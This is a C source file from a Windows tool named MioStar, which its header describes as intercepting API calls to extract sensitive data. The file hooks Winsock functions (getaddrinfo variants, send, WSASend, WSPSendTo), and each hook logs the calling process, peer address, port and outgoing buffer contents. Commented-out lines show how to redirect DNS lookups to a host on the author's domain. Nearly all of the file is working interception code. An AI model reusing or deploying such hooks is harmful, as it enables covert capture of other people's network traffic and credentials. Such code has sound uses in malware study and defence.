/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */


#include <winsock2.h>
#include <Ws2spi.h>
#include <Ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "MioStar.h"
#include "SocketReplacement.h"


extern byte* CG_send;
extern byte* CG_WSASend;
extern byte* CG_WSPSendTo;
extern byte* CG_InetAddr;
extern byte* CG_GetAddrInfoA;
extern byte* CG_GetAddrInfoW;
extern byte* CG_GetAddrInfoExA;
extern byte* CG_GetAddrInfoExW;
extern byte* CG_GetHostByName;
extern char gProcName[MAX_BUF_SIZE + 1];
extern char *gProcShortPath;






/*
 *
 *
 */

int WSAAPI MyGetAddrInfoExA(PCSTR pName, PCSTR pServiceName, DWORD dwNameSpace, LPGUID lpNspId, const ADDRINFOEXA *pHints, PADDRINFOEXA *ppResult, struct timeval *timeout, LPOVERLAPPED lpOverlapped, LPLOOKUPSERVICE_COMPLETION_ROUTINE lpCompletionRoutine, LPHANDLE lpNameHandle)
{
  int lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE];
  MYGETADDRINFOEXA fGetAddrInfoExA = (MYGETADDRINFOEXA) CG_GetAddrInfoExA;
  
  ZeroMemory(lTemp1, sizeof(lTemp1));

// Write the address of your choice in the NodeName parameter
//  if(fGetAddrInfoA)
//    lRetVal = fGetAddrInfoExA("carrumba.megapanzer.com",  pServiceName, dwNameSpace, lpNspId, pHints, ppResult, timeout, lpOverlapped, lpCompletionRoutine, lpNameHandle);
  if(fGetAddrInfoExA)
    lRetVal = fGetAddrInfoExA(pName, pServiceName, dwNameSpace, lpNspId, pHints, ppResult, timeout, lpOverlapped, lpCompletionRoutine, lpNameHandle);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyGetAddrInfoExA():NET:%s:%s:%s", gProcShortPath, pName, pServiceName);
  printDebug(lTemp1, EVENT_SOCKET);


  return(lRetVal);
}





/*
 *
 *
 */

int WSAAPI MyGetAddrInfoExW(PCWSTR pName, PCWSTR pServiceName, DWORD dwNameSpace, LPGUID lpNspId, const ADDRINFOEXW *pHints, PADDRINFOEXW *ppResult, struct timeval *timeout, LPOVERLAPPED lpOverlapped, LPLOOKUPSERVICE_COMPLETION_ROUTINE lpCompletionRoutine, LPHANDLE lpNameHandle)
{
  int lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE];
  MYGETADDRINFOEXW fGetAddrInfoExW = (MYGETADDRINFOEXW) CG_GetAddrInfoExW;
  
  ZeroMemory(lTemp1, sizeof(lTemp1));

// Write the address of your choice in the NodeName parameter
//  if(fGetAddrInfoExW)
//    lRetVal = fGetAddrInfoExW("carrumba.megapanzer.com",  pServiceName, dwNameSpace, lpNspId, pHints, ppResult, timeout, lpOverlapped, lpCompletionRoutine, lpNameHandle);
  if(fGetAddrInfoExW)
    lRetVal = fGetAddrInfoExW(pName, pServiceName, dwNameSpace, lpNspId, pHints, ppResult, timeout, lpOverlapped, lpCompletionRoutine, lpNameHandle);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyGetAddrInfoExW():NET:%s:%s:%s", gProcShortPath, pName, pServiceName);
  printDebug(lTemp1, EVENT_SOCKET);

  return(lRetVal);
}




/*
 *
 *
 */

int WINAPI MyGetAddrInfoA(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult)
{
  int lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE];
  MYGETADDRINFOA fGetAddrInfoA = (MYGETADDRINFOA) CG_GetAddrInfoA;
  
  ZeroMemory(lTemp1, sizeof(lTemp1));

// Write the address of your choice in the NodeName parameter
//  if(fGetAddrInfoA)
//    lRetVal = fGetAddrInfoA("carrumba.megapanzer.com", pServiceName, pHints, ppResult);
  if(fGetAddrInfoA)
    lRetVal = fGetAddrInfoA(pNodeName, pServiceName, pHints, ppResult);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyGetaddrinfoA():NET:%s:%s:%s", gProcShortPath, pNodeName, pServiceName);
  printDebug(lTemp1, EVENT_SOCKET);

  return(lRetVal);
}



/*
 *
 *
 */

int WINAPI MyGetAddrInfoW(PCWSTR pNodeName, PCWSTR pServiceName, const ADDRINFOW *pHints, PADDRINFOW *ppResult)
{
  int lRetVal = 0; // WRONG! but i dont know what the right FALSE value is. ideas?
  char lTemp1[MAX_BUF_SIZE];
  MYGETADDRINFOW fGetAddrInfoW = (MYGETADDRINFOW) CG_GetAddrInfoW;


// Write the address of your choice in the NodeName parameter
//  if(fGetAddrInfoW)
//    lRetVal = fGetAddrInfoW(L"carrumba.megapanzer.com", pServiceName, pHints, ppResult);

  if(fGetAddrInfoW)
    lRetVal = fGetAddrInfoW( pNodeName,  pServiceName, pHints, ppResult);


  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyGetaddrinfoW(0x%08x):NET:%s:%S:%S:%d", fGetAddrInfoW, gProcShortPath, pNodeName, pServiceName, lRetVal);
  printDebug(lTemp1, EVENT_SOCKET);


  return(lRetVal);
}








/*
 *
 *
 */

int WINAPI MyWSPSendTo(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, const struct sockaddr *lpTo, int iTolen, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine, LPWSATHREADID lpThreadId, LPINT lpErrno)
{
  int lRetVal = 0;
  int lPort = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lTemp3[MAX_BUF_SIZE + 1];
  struct sockaddr_in lSockName;
  int lNameLen = sizeof(lSockName);
  MYWSPSENDTO fWSPSendTo = (MYWSPSENDTO) CG_WSPSendTo;
  int iSize, iVal;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fWSPSendTo)
    lRetVal = fWSPSendTo(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpTo, iTolen, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);


  // Retrieve the type and print its value
  iSize = sizeof(iVal);

  if ((getsockopt(s, SOL_SOCKET, SO_TYPE, (char *) &iVal, &iSize)) != SOCKET_ERROR)
  {
    if (iVal == SOCK_STREAM)
      strncpy(lTemp2, "TCP", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_DGRAM)
      strncpy(lTemp2, "UDP", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_RDM)
      strncpy(lTemp2, "RDM", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_SEQPACKET)
      strncpy(lTemp2, "SEQPKACKET", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_RAW)
      strncpy(lTemp2, "RAW", sizeof(lTemp2) - 1);
    else
      strncpy(lTemp2, "UNKNOWN", sizeof(lTemp2) - 1);
  }


  
  /*
   * Determine peer data.
   *
   */

  ZeroMemory(&lSockName, lNameLen);
  getpeername(s, (struct sockaddr*) &lSockName, &lNameLen);
  InetNtop(AF_INET, &lSockName.sin_addr, lTemp3, MAX_BUF_SIZE);

  if (lSockName.sin_family == AF_INET)
	lPort = ntohs(lSockName.sin_port);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWSPSendTo():NET:%s:%s:%s:%d:%S", gProcShortPath, lTemp2, lTemp3, lPort, lpBuffers);
  printDebug(lTemp1, EVENT_SOCKET);

  return(lRetVal);
}






/*
 *
 *
 */

int WINAPI MyWSASend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
  int lRetVal = 0;
  int lPort = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lTemp3[MAX_BUF_SIZE + 1];
  struct sockaddr_in lSockName;
  int lNameLen = sizeof(lSockName);
  MYWSASEND fWSASend = (MYWSASEND) CG_WSASend;
  int iSize, iVal;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fWSASend)
    lRetVal = fWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);

  // Retrieve the type and print its value
  iSize = sizeof(iVal);

  if ((getsockopt(s, SOL_SOCKET, SO_TYPE, (char *) &iVal, &iSize)) != SOCKET_ERROR)
  {
    if (iVal == SOCK_STREAM)
      strncpy(lTemp2, "TCP", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_DGRAM)
      strncpy(lTemp2, "UDP", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_RDM)
      strncpy(lTemp2, "RDM", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_SEQPACKET)
      strncpy(lTemp2, "SEQPKACKET", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_RAW)
      strncpy(lTemp2, "RAW", sizeof(lTemp2) - 1);
    else
      strncpy(lTemp2, "UNKNOWN", sizeof(lTemp2) - 1);
  }

  
  /*
   * Determine peer data.
   *
   */

  ZeroMemory(&lSockName, lNameLen);
  getpeername(s, (struct sockaddr*) &lSockName, &lNameLen);
  InetNtop(AF_INET, &lSockName.sin_addr, lTemp3, MAX_BUF_SIZE);

  if (lSockName.sin_family == AF_INET)
	lPort = ntohs(lSockName.sin_port);



  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWSASend():NET:%s:%s:%s:%d:%S", gProcShortPath, lTemp2, lTemp3, lPort, lpBuffers);
  printDebug(lTemp1, EVENT_SOCKET);

  return(lRetVal);
}




/*
 *
 *
 */

int WINAPI MySend(SOCKET s, const char *buf, int len, int flags)
{
  int lRetVal = 0;
  MYSEND fSend = (MYSEND) CG_send;
  int lPort = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lTemp3[MAX_BUF_SIZE + 1];
  struct sockaddr_in lSockName;
  int lNameLen = sizeof(lSockName);
  int iSize, iVal;



  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));
  ZeroMemory(lTemp3, sizeof(lTemp3));


  if(fSend)
    lRetVal = fSend(s, buf, len, flags);



  // Retrieve the type and print its value
  iSize = sizeof(iVal);

  if ((getsockopt(s, SOL_SOCKET, SO_TYPE, (char *) &iVal, &iSize)) != SOCKET_ERROR)
  {
    if (iVal == SOCK_STREAM)
      strncpy(lTemp2, "TCP", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_DGRAM)
      strncpy(lTemp2, "UDP", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_RDM)
      strncpy(lTemp2, "RDM", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_SEQPACKET)
      strncpy(lTemp2, "SEQPKACKET", sizeof(lTemp2) - 1);
    else if (iVal == SOCK_RAW)
      strncpy(lTemp2, "RAW", sizeof(lTemp2) - 1);
    else
      strncpy(lTemp2, "UNKNOWN", sizeof(lTemp2) - 1);
  }

  if (lRetVal > 1 && lRetVal < 1024)
    memcpy(lTemp3, buf, lRetVal);



  /*
   * Determine peer data.
   *
   */

  ZeroMemory(&lSockName, lNameLen);
  getpeername(s, (struct sockaddr*) &lSockName, &lNameLen);
  InetNtop(AF_INET, &lSockName.sin_addr, lTemp3, MAX_BUF_SIZE);

  if (lSockName.sin_family == AF_INET)
	lPort = ntohs(lSockName.sin_port);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MySend():NET:%s:%s:%s:%d:%s", gProcShortPath, lTemp2, lTemp3, lPort, buf);
  printDebug(lTemp1, EVENT_SOCKET);

  return(lRetVal);
}



